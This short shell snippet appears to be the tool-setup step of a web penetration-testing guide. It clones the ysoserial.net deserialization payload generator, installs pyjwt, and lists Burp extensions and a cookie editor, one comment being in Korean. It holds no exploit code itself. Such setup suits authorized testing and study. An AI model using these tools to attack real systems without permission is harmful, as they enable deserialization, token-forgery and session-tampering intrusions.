git clone --depth 1 https://github.com/pwntester/ysoserial.net ~/ysoserial-net
pip install pyjwt
# Burp BApp Store: JWT Editor, autorize, Server Side Prototype Pollution Scanner
# EditThisCookie: Chrome 확장
```
